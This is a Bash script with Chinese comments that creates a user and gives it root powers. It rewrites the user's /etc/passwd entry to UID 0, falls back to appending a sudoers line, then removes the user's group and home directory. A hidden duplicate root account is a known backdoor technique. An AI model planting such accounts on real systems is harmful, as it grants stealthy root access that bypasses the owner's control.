#!/bin/bash

# 检查当前用户是否为root用户
if [[ $EUID -ne 0 ]]; then
   echo "请以root用户身份运行该脚本。"
   exit 1
fi

# 检查是否提供了足够的参数
if [[ $# -ne 2 ]]; then
   echo "请提供用户名和密码作为脚本参数。"
   echo "示例: $0 <用户名> <密码>"
   exit 1
fi

# 获取用户名和密码
username=$1
password=$2

# 创建用户
useradd -m $username
# 检查用户创建是否成功
if [[ $? -ne 0 ]]; then
   echo "无法创建用户 $username，请检查参数或其他限制。"
   exit 1
fi

# 设置用户密码
echo "$username:$password" | chpasswd

# 将用户添加到root组
usermod -g root $username
#echo "$username ALL=(ALL) ALL">>/etc/sudoers #若修改/etc/passwd则没必要添加
echo "管理员用户 $username 创建成功。"
# 以正则表达式查找并替换 UID
sed -i "s|^$username:x:.*:|$username:x:0:0:root:/root:|g" /etc/passwd
# 检查sed命令是否成功执行
if [[ $? -ne 0 ]]; then
   echo "无法直接修改/etc/passwd中用户 $username 的UID。"
   echo "尝试添加sudo"
   echo "$username ALL=(ALL) ALL">>/etc/sudoers
   # 检查echo命令是否成功执行
	if [[ $? -ne 0 ]]; then
		echo "无法将用户 $username 添加到sudoers文件，请检查参数或其他限制。"
	else
		echo "将用户 $username 添加到sudoers文件，sudo su既可获得root权限。"
	fi
	
	
   exit 1
   
else
	echo "用户 $username的UID已成功修改为0。"
	# 删除用户组
	groupdel $username
	#删除目录
	rm -rf /home/$username
fi


